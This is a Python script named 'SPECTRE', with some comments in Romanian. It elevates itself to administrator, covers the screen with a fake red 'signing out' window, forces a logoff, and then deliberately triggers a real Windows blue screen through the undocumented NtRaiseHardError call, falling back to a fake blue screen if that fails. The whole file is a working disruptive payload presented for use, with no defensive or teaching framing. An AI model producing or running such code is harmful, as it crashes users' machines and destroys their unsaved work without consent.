#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SPECTRE - FINAL VERSION
Red screen + Real signout + REAL BSOD
Run as ADMINISTRATOR (script auto-elevates)
"""

import tkinter as tk
import threading
import time
import subprocess
import sys
import ctypes
import os

# ===== CONFIG =====
WAIT_SECONDS = 10
# =================

# ============================================
# AUTO ADMIN RESTART
# ============================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
    sys.exit()

if not is_admin():
    run_as_admin()

# ============================================
# PHASE 1: RED FULLSCREEN
# ============================================

def phase1_red():
    def red_window():
        root = tk.Tk()
        w = root.winfo_screenwidth()
        h = root.winfo_screenheight()
        
        root.configure(background="red")
        root.overrideredirect(True)
        root.geometry(f"{w}x{h}+0+0")
        root.attributes("-topmost", True)
        root.attributes("-fullscreen", True)
        root.focus_force()
        root.grab_set()
        
        tk.Label(root, 
                text="⚠️ SIGNING OUT ⚠️", 
                font=("Segoe UI", 56, "bold"),
                fg="white", bg="red").pack(expand=True)
        
        label2 = tk.Label(root,
                         text="Windows is preparing to sign you out",
                         font=("Segoe UI", 28),
                         fg="white", bg="red")
        label2.pack()
        
        label3 = tk.Label(root,
                         text=f"Time remaining: {WAIT_SECONDS} seconds",
                         font=("Segoe UI", 20),
                         fg="white", bg="red")
        label3.pack(pady=30)
        
        dots = 0
        remaining = WAIT_SECONDS
        
        def update():
            nonlocal dots, remaining
            dots = (dots + 1) % 4
            label2.config(text="Please wait" + "." * dots)
            
            if remaining > 0:
                label3.config(text=f"Time remaining: {remaining} seconds")
                remaining -= 1
                root.after(1000, update)
            else:
                label2.config(text="Signing out now...")
                label3.config(text="")
        
        root.after(1000, update)
        root.mainloop()
    
    t = threading.Thread(target=red_window, daemon=True)
    t.start()
    time.sleep(WAIT_SECONDS)

# ============================================
# PHASE 2: REAL SIGNOUT
# ============================================

def do_real_signout():
    # Method 1: shutdown
    try:
        subprocess.run(["shutdown", "/l"], check=True, capture_output=True)
        time.sleep(2)
        return
    except:
        pass
    
    # Method 2: ctypes
    try:
        EWX_LOGOFF = 0x00000000
        EWX_FORCE = 0x00000004
        ctypes.windll.user32.ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0)
        time.sleep(2)
        return
    except:
        pass
    
    # Method 3: pywin32 (if installed)
    try:
        from win32api import ExitWindowsEx
        from win32con import EWX_LOGOFF, EWX_FORCE
        ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0)
        time.sleep(2)
        return
    except:
        pass
    
    # Method 4: wmi (if installed)
    try:
        import wmi
        c = wmi.WMI(privileges=["Shutdown"])
        for os in c.Win32_OperatingSystem():
            os.Win32Shutdown(Flags=0)
        time.sleep(2)
        return
    except:
        pass
    
    # If all signout methods fail, proceed to BSOD

# ============================================
# PHASE 3: BSOD 
# ============================================

def do_real_bsod():
    """
    REAL Blue Screen of Death using Windows API
    NtRaiseHardError + RtlAdjustPrivilege
    """
    try:
        from ctypes import wintypes
        
        ntdll = ctypes.WinDLL('ntdll.dll')
        
        # Constante
        SE_SHUTDOWN_PRIVILEGE = 19
        STATUS_ASSERTION_FAILURE = 0xC0000420
        STATUS_SYSTEM_PROCESS_TERMINATED = 0xC000021A
        
        # Definire functii
        RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
        RtlAdjustPrivilege.argtypes = [wintypes.ULONG, ctypes.c_byte, ctypes.c_byte, ctypes.POINTER(ctypes.c_byte)]
        RtlAdjustPrivilege.restype = wintypes.LONG
        
        NtRaiseHardError = ntdll.NtRaiseHardError
        NtRaiseHardError.argtypes = [wintypes.LONG, wintypes.ULONG, wintypes.ULONG, ctypes.c_void_p, wintypes.ULONG, ctypes.POINTER(wintypes.ULONG)]
        NtRaiseHardError.restype = wintypes.LONG
        
        # Activeaza privilegiul
        privilege_enabled = ctypes.c_byte()
        RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, 1, 0, ctypes.byref(privilege_enabled))
        
        # Declanseaza BSOD
        response = wintypes.ULONG()
        NtRaiseHardError(STATUS_SYSTEM_PROCESS_TERMINATED, 0, 0, None, 6, ctypes.byref(response))
        
        # Backup method daca prima nu merge
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, None, 6, ctypes.byref(response))
        
    except Exception as e:
        # Daca API-ul esueaza, fallback la fake BSOD
        fake_bsod()

def fake_bsod():
    """Fallback fake BSOD daca cel real nu functioneaza"""
    try:
        bsod_root = tk.Tk()
        w = bsod_root.winfo_screenwidth()
        h = bsod_root.winfo_screenheight()
        
        bsod_root.configure(background="#0000AA")
        bsod_root.overrideredirect(True)
        bsod_root.geometry(f"{w}x{h}+0+0")
        bsod_root.attributes("-topmost", True)
        bsod_root.focus_force()
        bsod_root.grab_set()
        
        tk.Label(bsod_root,
                text=":(",
                font=("Segoe UI", 120),
                fg="white", bg="#0000AA").pack(pady=50)
        
        tk.Label(bsod_root,
                text="Your PC ran into a problem and needs to restart.",
                font=("Segoe UI", 24),
                fg="white", bg="#0000AA").pack(pady=20)
        
        tk.Label(bsod_root,
                text="We're just collecting some error info, and then we'll restart for you.",
                font=("Segoe UI", 18),
                fg="white", bg="#0000AA").pack()
        
        progress = tk.Label(bsod_root,
                          text="0% complete",
                          font=("Segoe UI", 16),
                          fg="white", bg="#0000AA")
        progress.pack(pady=50)
        
        def update_progress():
            for i in range(0, 101, 2):
                progress.config(text=f"{i}% complete")
                bsod_root.update()
                time.sleep(0.1)
            progress.config(text="Restarting...")
            time.sleep(2)
        
        threading.Thread(target=update_progress, daemon=True).start()
        bsod_root.mainloop()
    except:
        pass

# ============================================
# MAIN EXECUTION
# ============================================

if __name__ == "__main__":
    # Phase 1: Red screen
    phase1_red()
    
    # Phase 2: Try real signout
    do_real_signout()
    
    # Phase 3: REAL BSOD (runs even if signout succeeded or failed)
    # Small delay to ensure signout doesn't interfere
    time.sleep(1)
    do_real_bsod()